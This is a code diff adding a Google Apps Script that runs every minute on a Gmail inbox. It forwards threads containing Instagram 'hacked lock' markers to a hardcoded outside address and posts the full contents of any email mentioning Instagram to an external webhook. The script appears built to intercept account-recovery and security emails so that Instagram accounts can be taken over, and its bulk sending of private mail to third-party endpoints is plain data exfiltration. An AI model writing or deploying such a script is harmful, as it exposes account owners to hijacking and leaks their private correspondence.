@@ -1,0 +1,175 @@
+const TARGET_EMAIL = 'k3yt10@gmail.com';
+const FORWARD_LABEL_NAME = 'forwarded_ig_hacked';
+const HEADER_KEYWORD = 'ig_hacked_lock_enroll';
+const BODY_KEYWORD = 'hacked_lock_redirect';
+
+const WEBHOOK_BASE_URL = 'https://webhook.akunlama.com/';
+
+/**
+ * SATU-SATUNYA fungsi yang perlu di-trigger.
+ * - Cek apakah perlu forward ke k3yt10@gmail.com
+ * - Cek apakah perlu kirim ke webhook (body mengandung "instagram", tanpa duplikat)
+ */
+function processEmails() {
+  try {
+    function sendToWebhookIfNeeded(msg, props) {
+      var msgId = msg.getId();
+      var propKey = 'webhook_' + msgId;
+
+      if (props.getProperty(propKey)) {
+        return false;
+      }
+
+      var body = msg.getPlainBody() || '';
+      var bodyLower = body.toLowerCase();
+
+      if (bodyLower.indexOf('instagram') === -1) {
+        return false;
+      }
+
+      var toHeader = msg.getTo() || '';
+      if (!toHeader) {
+        Logger.log('No "To" header for message: ' + msgId);
+        return false;
+      }
+
+      var firstAddress = toHeader.split(',')[0].trim();
+
+      var matchAngle = firstAddress.match(/<(.+?)>/);
+      var email = matchAngle ? matchAngle[1] : firstAddress;
+
+      if (!email) {
+        Logger.log('Could not parse recipient email from: ' + firstAddress);
+        return false;
+      }
+
+      var username = email.split('@')[0];
+      if (!username) {
+        Logger.log('Could not extract username from email: ' + email);
+        return false;
+      }
+
+      var webhookUrl = WEBHOOK_BASE_URL + encodeURIComponent(username);
+
+      var payload = {
+        id: msgId,
+        from: msg.getFrom(),
+        to: msg.getTo(),
+        subject: msg.getSubject(),
+        date: msg.getDate() ? msg.getDate().toISOString() : null,
+        plainBody: body
+      };
+
+      try {
+        var response = UrlFetchApp.fetch(webhookUrl, {
+          method: 'post',
+          contentType: 'application/json',
+          payload: JSON.stringify(payload),
+          muteHttpExceptions: true
+        });
+
+        var code = response.getResponseCode();
+        Logger.log('Webhook POST to ' + webhookUrl + ' -> ' + code);
+
+        if (code >= 200 && code < 300) {
+          props.setProperty(propKey, 'sent');
+          return true;
+        } else {
+          Logger.log(
+            'Webhook failed (' + code + '): ' +
+            response.getContentText().slice(0, 300)
+          );
+          return false;
+        }
+      } catch (e) {
+        Logger.log('Error sending webhook for message ' + msgId + ': ' + e);
+        return false;
+      }
+    }
+
+    var label = GmailApp.getUserLabelByName(FORWARD_LABEL_NAME);
+    if (!label) label = GmailApp.createLabel(FORWARD_LABEL_NAME);
+
+    var threads = GmailApp.search('newer_than:1d -label:' + FORWARD_LABEL_NAME, 0, 50);
+
+    var forwardedCount = 0;
+    var webhookCount = 0;
+    var props = PropertiesService.getScriptProperties();
+
+    threads.forEach(function (thread) {
+      var messages = thread.getMessages();
+      var shouldForward = false;
+
+      messages.forEach(function (msg) {
+        var raw = msg.getRawContent() || "";
+        var body = msg.getPlainBody() || "";
+
+        if (raw.indexOf(HEADER_KEYWORD) !== -1 || body.indexOf(BODY_KEYWORD) !== -1) {
+          shouldForward = true;
+        }
+
+        if (sendToWebhookIfNeeded(msg, props)) {
+          webhookCount++;
+        }
+      });
+
+      if (shouldForward) {
+        messages.forEach(function (msg) {
+          try {
+            var msgId = msg.getId();
+            var forwardKey = 'forwarded_email_' + msgId;
+
+            // Check if THIS specific message was already forwarded
+            if (props.getProperty(forwardKey)) {
+              return; // Skip this message
+            }
+
+            msg.forward(TARGET_EMAIL);
+            props.setProperty(forwardKey, 'true');
+            forwardedCount++;
+            Logger.log('Forwarded message: ' + msgId);
+          } catch (e) {
+            Logger.log('Failed to forward message ' + msg.getId() + ': ' + e);
+          }
+        });
+
+        // Label thread to exclude from future searches (Performance optimization)
+        try {
+          thread.addLabel(label);
+        } catch (e) {
+          Logger.log('Failed to label thread: ' + e);
+        }
+      }
+    });
+
+    Logger.log('Total forwarded: ' + forwardedCount);
+    Logger.log('Total webhooks sent: ' + webhookCount);
+  } catch (err) {
+    Logger.log('Error: ' + err);
+  }
+}
+
+/**
+ * Run this function ONCE manually to set up the automatic trigger.
+ * It will run 'processEmails' every 1 minute.
+ */
+function setupTrigger() {
+  var triggerName = 'processEmails';
+  
+  // Check if trigger already exists
+  var triggers = ScriptApp.getProjectTriggers();
+  for (var i = 0; i < triggers.length; i++) {
+    if (triggers[i].getHandlerFunction() === triggerName) {
+      Logger.log('Trigger already exists.');
+      return;
+    }
+  }
+  
+  // Create new trigger
+  ScriptApp.newTrigger(triggerName)
+    .timeBased()
+    .everyMinutes(1)
+    .create();
+    
+  Logger.log('Trigger created successfully. Script will run every 1 minute.');
+}
